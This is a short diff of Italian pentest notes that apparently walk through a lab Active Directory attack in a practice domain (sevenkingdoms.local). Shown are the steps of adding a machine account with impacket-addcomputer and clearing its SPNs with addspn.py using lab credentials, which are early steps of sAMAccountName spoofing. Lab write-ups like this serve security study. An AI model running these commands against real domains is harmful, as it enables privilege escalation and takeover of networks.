@@ -114,3 +114,8 @@ Ora aggiungiamo il nuovo computer al domain
 impacket-addcomputer -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
 ![[Pasted image 20230825162234.png]]
+Ora puliamo l'SPNs del nuovo computer
+```bash
+python3 addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
+```
+
